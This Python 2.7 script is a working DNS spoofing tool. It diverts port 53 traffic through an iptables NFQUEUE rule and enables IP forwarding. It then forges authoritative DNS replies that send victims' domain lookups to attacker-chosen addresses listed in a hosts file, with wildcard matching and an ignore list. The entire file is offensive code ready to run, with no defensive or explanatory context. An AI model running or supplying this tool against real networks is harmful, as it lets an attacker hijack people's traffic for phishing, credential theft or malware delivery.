#! /usr/bin/env python2.7
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os,sys

ignoreds = []

def usage():
    print "[*]Usage: python dnsspoof_with_queue.py [host file] [ignore-list]"

def modify(packet):
    global ignoreds
    #print "packet found"
    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string

    if pkt[IP].src in ignoreds:
	#print "Ignoring packet from "+pkt[IP].src
	packet.accept()
	return

    #modify the packet all you want here
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        #print "dns packet found"
        queried = pkt[DNS].qd.qname
        for key in dict:
            if queried.find(key) != -1 or key == '*':
                spoofed_IP = dict[key]
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed_IP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
                print '[+] Redirecting ' + pkt[IP].src + " to " + spoofed_IP +" for domain " + queried
                return
        #print "No entries in host file for domain " + queried
        packet.accept()
        
if len(sys.argv)<3:
    usage()
    exit(1)
    
dict = {}
hosts = sys.argv[1]
ignores = sys.argv[2]

ignoreds = ignores.split(',')

with open(hosts) as f:
    entries = f.readlines()
for entry in entries:
    columns = entry.split(' ')
    dict[columns[1].strip()] = columns[0]
print "Loaded dictionary " + str(dict)

os.system('iptables -t raw -I PREROUTING 1 -p udp --dport 53 -j NFQUEUE --queue-num 1')
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    os.system('iptables -t raw -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    pass
